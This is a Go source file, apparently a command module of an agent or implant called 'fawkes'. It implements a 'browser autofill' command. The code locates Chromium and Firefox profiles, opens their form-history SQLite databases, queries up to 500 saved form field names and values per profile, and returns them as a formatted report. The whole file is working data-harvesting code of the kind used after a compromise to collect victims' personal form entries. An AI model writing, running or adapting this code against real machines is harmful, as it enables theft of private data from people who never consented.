package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

// browserAutofill extracts autofill form data from Chromium-based browsers.
func browserAutofill(args browserArgs) structs.CommandResult {
	paths := browserPaths(args.Browser)
	if paths == nil {
		return errorResult("Could not determine browser data paths")
	}

	type autofillEntry struct {
		Browser      string
		FieldName    string
		Value        string
		Count        int
		DateLastUsed string
	}

	var allEntries []autofillEntry
	var errors []string

	for browserName, userDataDir := range paths {
		if _, err := os.Stat(userDataDir); os.IsNotExist(err) {
			continue
		}

		var profiles []string
		var dbFile, query string
		var timeConvert func(int64) string

		if isFirefoxBrowser(browserName) {
			profiles = findFirefoxProfiles(userDataDir)
			dbFile = "formhistory.sqlite"
			query = "SELECT fieldname, value, timesUsed, lastUsed FROM moz_formhistory ORDER BY lastUsed DESC LIMIT 500"
			timeConvert = firefoxTimeToString
		} else {
			profiles = findProfilesWithFile(userDataDir, "Web Data")
			dbFile = "Web Data"
			query = "SELECT name, value, count, date_last_used FROM autofill ORDER BY date_last_used DESC LIMIT 500"
			timeConvert = chromeTimeToString
		}

		if len(profiles) == 0 {
			continue
		}

		for _, profileDir := range profiles {
			dbPath := filepath.Join(profileDir, dbFile)
			profileName := filepath.Base(profileDir)

			db, cleanup, err := openBrowserDB(dbPath)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): %v", browserName, profileName, err))
				continue
			}

			rows, err := db.Query(query)
			if err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): query: %v", browserName, profileName, err))
				cleanup()
				continue
			}

			label := browserName
			if profileName != "Default" {
				label = fmt.Sprintf("%s (%s)", browserName, profileName)
			}

			for rows.Next() {
				var name, value string
				var count int
				var dateLastUsed int64

				if err := rows.Scan(&name, &value, &count, &dateLastUsed); err != nil {
					continue
				}

				allEntries = append(allEntries, autofillEntry{
					Browser:      label,
					FieldName:    name,
					Value:        value,
					Count:        count,
					DateLastUsed: timeConvert(dateLastUsed),
				})
			}
			if err := rows.Err(); err != nil {
				errors = append(errors, fmt.Sprintf("%s (%s): iteration: %v", browserName, profileName, err))
			}
			rows.Close()
			cleanup()
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("=== Browser Autofill (%d entries) ===\n\n", len(allEntries)))

	for _, e := range allEntries {
		sb.WriteString(fmt.Sprintf("[%s] %s = %s  (used: %d times, last: %s)\n",
			e.Browser, e.FieldName, truncStr(e.Value, 60), e.Count, e.DateLastUsed))
	}

	if len(errors) > 0 {
		sb.WriteString("\n--- Errors ---\n")
		for _, e := range errors {
			sb.WriteString(fmt.Sprintf("  %s\n", e))
		}
	}

	return successResult(sb.String())
}
